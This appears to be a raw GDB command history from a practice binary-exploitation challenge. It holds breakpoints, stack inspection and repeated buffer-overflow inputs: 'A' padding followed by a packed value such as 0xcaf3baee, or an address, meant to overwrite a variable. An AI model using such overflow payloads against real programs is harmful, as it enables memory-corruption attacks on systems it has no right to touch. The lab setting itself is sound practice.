exit
disassemble main
-0x1c
AAAAAAAAAAAAAAAAAAAAAAAA0xcaf3baee
r AAAAAAAAAAAAAAAAAAAAAAAA0xcaf3baee
exit
b main
r < payload
c
disassemble main
r
disassemble main
info functions
exit
disassemble main
b *0x4006a8
r
r
r < payload
exit
r < payload
b main
exit
r
r
r
r boi
exit
disassemble main
b *main+103
c
r
r
r
sys").stdout.buffer.write(b"A"*56 + b"\x5a\x1e\x3c\x5a\x00\x00\x00\x00")' | /challenge/binary-exploitation-var-control 
r < payload
info registers
x/g $eax
x/g eax
i r eax
exit
b *main+103
r < payload
exit
b *main+103
r < payload
exit
r < payload
b *main+103
exit
b *main+103
r < payload
exit
r < payload
b *main+103
exit
b *main+103
r < payload
exit
disassemble main
b *(main+103)
r
info stack
b main 
r
info stack
telescope
x/g $rbp+28
unhex
unhex 18014673387421695
xt
xiitt
qi
it
disassemble main
b *(main+103)
r
c
r
quit
b *(main+103)
r
telescope $rbp
x/g $rbp+28
x/g $rbp-28
x/g $rbp-0x28
x/g $rbp+0x28
x/16g $rbp+0x28
x/16xg $rbp+0x28
exit
b main
r
x/16g $rbp+0x28
x/16xg $rbp+0x28
x/16xg $rbp-0x28
x/xg $rbp-0x28
x/xg $rbp+0x28
x/xg *$rbp+0x28
x/xg *($rbp+0x28)
x/xg $rbp+0x28
x/xg [$rbp+0x28]
x/xg *[$rbp+0x28]
ni
ni
ni
telescope $rbp
x/16xg $rbp-0x48
exit
b main
telescope $rbp
r
telescope $rbp
x/16xg $rbp-0x48
b 0x400641
b *0x400641
c
quit
run <<< $(python3 -c "print('A' * 20 + '\xee\xba\xf3\xca', end='')")
exit
b main
run <<< $(python3 -c "print('A' * 20 + '\xee\xba\xf3\xca', end='')")
x/4xb $rbp-0x24
ni
x/4xb $rbp-0x24
ni
ni
x/4xb $rbp-0x24
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
x/4xb $rbp-0x24
ni
ni
ni
ni
x/4xb $rbp-0x24
x/4xb $rbp-0x24
ni
ni
x/4xb $rbp-0x24
ni
x/4xb $rbp-0x24
exit
run <<< $(python3 -c "print(b'A'*20 + b'\xee\xba\xf3\xca', end='')")
b main
exit
b main
run <<< $(python3 -c "print(b'A'*20 + b'\xee\xba\xf3\xca', end='')")
x/4xb $rbp-0x24
exit
b *main+103
run <<< $(python3 -c "print(b'A'*20 + b'\xee\xba\xf3\xca', end='')")
x/4xb $rbp-0x24
exit
run <<< $(python3 -c "import pwn;b"A"*20 + pwn.p32(0xcaf3baee)")
run <<< $(python3 -c "import pwn;print(b"A"*20 + pwn.p32(0xcaf3baee))")
exit
run <<< $("python3 -c 'import sys, pwn; sys.stdout.buffer.write(b"A"*20 + pwn.p32(0xcaf3baee))'")
exit
b main
run <<< $("python3 -c 'import sys, pwn; sys.stdout.buffer.write(b"A"*20 + pwn.p32(0xcaf3baee))'")
x/4xb $rbp-0x24
ni
ni
ni
x/4xb $rbp-0x24
b *main+103
c
x/4xb $rbp-0x24
ni
ni
ni
exit
run <<< $(python3 -c 'python3 -c 'import pwn;print(b"A"*20 + pwn.p32(0xcaf3baee))')
run <<< $(python3 -c ''import pwn;print(b"A"*20 + pwn.p32(0xcaf3baee))')
run <<< $(python3 -c 'import pwn;print(b"A"*20 + pwn.p32(0xcaf3baee))')
exit
b main
run <<< $(python3 -c 'import pwn;print(b"A"*20 + pwn.p32(0xcaf3baee))')
x/4xb $rbp-0x24
ni
ni
ni
ni
ni
x/4xb $rbp-0x24
ni
ni
ni
ni
ni
ni
x/4xb $rbp-0x24
ni
x/4xb $rbp-0x24
ni
x/4xb $rbp-0x24
ni
ni
ni
ni
x/4xb $rbp-0x24
ni
ni
x/4xb $rbp-0x24
ni
x/4xb $rbp-0x24
exit
r < payload
exit
b main
r < payload
b *main+103
c
ni
x/4xb $rbp-0x24
r < payloadexit
exit
b *main+103
r < payload
exit
b *main+103
r < payload
c
exit
b *main+103
r < payload
c
exit
exit
b *main+103
r < payload
p $eax
exit
*0x4006a8
b *0x4006a8
c
r < payload
exit
b *0x4006a8
r < payload
exit
disassemble main
b *(main+103)
r < payload
disassemble main
exit
disassemble main
exit
